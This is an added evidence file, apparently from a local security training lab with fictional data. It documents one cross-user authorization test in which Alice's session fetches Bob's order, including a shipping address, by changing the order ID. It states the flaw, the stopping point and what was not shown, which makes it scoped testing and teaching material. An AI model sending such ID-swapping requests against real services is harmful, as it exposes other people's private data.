@@ -1,0 +1,46 @@
+EVIDENCE ID: E-03
+PURPOSE: Minimal cross-user authorization validation
+ENVIRONMENT: UmbraMarket local training lab
+DATA: FICTIONAL
+STOP CONDITION: Stop after one successful cross-user response
+
+REQUEST
+-------
+GET /api/orders/1002 HTTP/1.1
+Host: 127.0.0.1:5005
+Cookie: session=<redacted-alice-session>
+
+RESPONSE
+--------
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 1002,
+  "user_id": 2,
+  "item": "Terni Chair",
+  "total": 189.0,
+  "shipping_address": "Via Roma 22, Terni"
+}
+
+VALIDATION STATEMENT
+--------------------
+The same fictional Alice identity used in E-01 received the object established
+as Bob's order in E-02 after changing only the requested order identifier.
+
+CONCLUSION SUPPORTED
+--------------------
+A customer can read another customer's order because the endpoint authenticates
+the requester but does not enforce object ownership.
+
+STOP
+----
+No additional order identifiers were enumerated.
+
+NOT DEMONSTRATED
+----------------
+- access to every order;
+- modification of orders;
+- database compromise;
+- account takeover;
+- server compromise.
